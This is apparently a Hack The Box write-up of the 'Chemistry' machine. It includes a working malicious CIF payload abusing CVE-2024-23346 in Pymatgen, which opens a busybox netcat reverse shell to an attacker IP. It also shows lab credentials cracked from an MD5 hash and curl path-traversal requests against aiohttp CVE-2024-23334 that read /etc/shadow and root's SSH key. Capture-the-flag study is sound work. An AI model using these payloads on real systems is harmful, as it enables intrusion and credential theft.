---
title: Chemistry
description: In chemistry we get to exploit an arbitrary code execution vulnerability in Pymatgen library by uploading a malicious CIF file triggering an RCE. We get access to a database file leaking hashed credentials that get cracked. Finally we find port 8080, locally running a web application that uses aiohttp vulnerable to LFI, which we use to get access to root user private key  
date: 2024-11-07 21:00:00 +/-1000
categories: [HTB, Machines, Linux]
tags: [htb, linux] # TAG names should always be lowercase
media_subpath: /assets/img/posts/chemistry/
image: 
  path: chemistry.old.png
  lqip: data:image/webp;base64,UklGRmAAAABXRUJQVlA4IFQAAADQAwCdASoUABQAPzmMulavKSUpKA1R4CcJYwDO7A9m1DSElNvfT4AA/rn1G4Uygh1vCQlrwIeHEN7ptQZOrh+05Iuf6uHE2jl72MAqcP6FK9MAAAA=
---

# Box Info

| Name       | [Chemistry](https://app.hackthebox.com/machines/Chemistry)             |
| :--------- | :--------------------------------------------------------------------- |
| OS         | Linux                                                                  |
| Difficulty | Easy                                                                   |
| Points     | 20                                                                     |
| Author     | <img alt="NLTE" src="https://www.hackthebox.com/badge/image/1076236"/> |

----

## Information Gathering

### Reconnaissance

#### NMAP Scan

Stripped out NMAP scan result, highlighting the key ports and services.

```
PORT     STATE SERVICE REASON  VERSION 
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?   syn-ack
| fingerprint-strings:
|   GetRequest:                                       
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5 ... 
```

### Enumeration

#### Web : Port 5000

By analyzing the scan and port, we can determine that the application is built using Python Flask Web Framework. 

![CIF](CIF.png)
_Landing Page_

After registering with `user:user`, we get reidrected to `/dashboard`

![dashboard](dashboard.png)
_dashboard_

The application appears to have a file upload functionality. However, after testing various methods, including regular file uploads and RCE attempts, even with specific file extensions (CIF) that the appliation prefers, I had no success. As a next step, I downloaded the example file it provided.

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```
{: file="example.cif" }

Uploading the same file worked as expected, and we were given the option to view the data. *Directory busting yielded no significant results*. This suggests that the vulnerability likely lies in how the backend application processes variables or values from the CIF file.

To investigate further, I searched using keywords from my enumeration so far: `CIF`, `python`, and `exploit`, and found the following...

![googleSearch](google.png)

## Exploitation

### CVE-2024-23346

[CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346) describes an arbitrary code execution vulnerability in Python applications that use [Pymatgen](https://pymatgen.org/), an open-source library for materials analysis. The vulnerability arises from the insecure use of `eval()` for processing input, which allows the execution of arbitrary code when untrusted input is parsed. This issue affects versions of Pymatgen prior to `2024.2.8`.

To learn more about the CVE and access PoC details, visit the following links

[CVE-2024-23346: Arbitrary Code Execution in Pymatgen via Insecure Deserialization](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/)

[Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

#### Proof of Concept

To achieve RCE via ACE, we need to craft a malicious CIF file payload.

```yml
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.82 1337 -e /bin/bash");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
{: file="evil.cif" }

### Initial Access

> I tried several common reverse shell payloads, but none were successful. However, piping commands with nc worked as expected, for example: `which nc | nc $IP $PORT`. After experimenting with various payloads from the [Reverse Shell Generator](https://www.revshells.com/), I finally succeeded using the `BusyBox nc -e` payload.
{: .prompt-info }

#### $hell as app

Once the CIF payload file is created, set up a netcat listener `nc -lvnp 1337` and upload the `evil.cif` file. To trigger the RCE, simply click on `View` and you should receive a reverse shell as the `app` user.

## Priviledge Escalation

> Get a Stable Shell\
> `python3 -c 'import pty; pty.spawn("/bin/bash")'`\
> Press `CTRL+Z`\
> `stty raw -echo; fg; reset`\
> Press Enter two times\
> `export TERM=xterm`
{: .prompt-tip}

### Local User Enumeration

After obtaining a shell as the `app` user, we discover the `app.py` file in the home directory, which is the main Flask application script. Upon inspecting the file, we find that it contains some database credentials.

```python
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'                                  
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
```
{: file="app.py"}

Listing all regular users on the system

```bash
$ cat /etc/passwd  | grep -P "/bin/.?.sh"
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

I attempted to SSH as the `app` user using the database `SECRET_KEY` or password, but it was unsuccessful.

### Horizontal PE to rosa

Upon accessing the database file at `instance/database.db`, i found the following hashed credentials and successfully cracked the MD5 hash for the rosa user using [crackstation](https://crackstation.net/)

```sql
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5 # cracked : unicorniosrosados
```

Using the cracked credentials, I was able to SSH as the `rosa` user.

### Getting Root Access

#### Port Forwording 8080

After some enumeration, I discovered that port 8080 is open and running locally

`rosa@chemistry:~$ netstat -tunlp`

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name  
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -               
tcp        3      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

I sent a cURL request to confirm that the web application was up and running.

```bash
rosa@chemistry:~$ curl -I localhost:8080
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Sat, 09 Nov 2024 05:14:00 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Since the machine was too slow, i forwarded the port to my attacker machine to test locally

```python
SSH -L 8888:127.0.0.1:8080 rosa@chemistry.htb
```

#### Vulnerable aiohttp LFI

From the previous cURL request, it appears that the web application is a Python Flask app, and it seems to be using [aiohttp](https://pypi.org/project/aiohttp/) for handling request routes.

With this information i simply googled `aiohttp/3.9.1 vulnerability` and found that it is vulerable to [CVE-2024-23334](https://nvd.nist.gov/vuln/detail/CVE-2024-23334). A path traversal vulnerability in the python AioHTTP library =< 3.9.1

After reviewing various reports and proof-of-concepts (PoCs) for the CVE, I found that the simplest payload can be executed using a basic cURL request.

```bash
curl -s --path-as-is "http://localhost:8081/static/../../../../../etc/passwd
```

However, I initially received a `404: Not Found error`. After performing some directory busting, I discovered the path `/assets (Status: 403, Size: 14)`, which indicated that the static folder is located elsewhere, so for the application we are dealing with it could be `assets` for the static path, now all that's needed is to change `static` to `assets`.

```bash
curl -s --path-as-is http://localhost:8888/assets/../../../../../etc/passwd
```

Learn more about the vulnerability at

[CVE-2024-23334: A Deep Dive into aiohttp's Directory Traversal Vulnerability](https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/)\
[aiohttp.web.static(follow_symlinks=True) is vulnerable to directory traversal](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f)


#### #PWNED

With Local File Inclusion (LFI) now confirmed, I attempted to list files such as `/etc/shadow`, and the request was successful. This indicates that we can read arbitrary files on the system. In fact, when attempting to read `/root/.ssh/id_rsa`, the private key was returned, which we the use to SSH into the system as the root user.

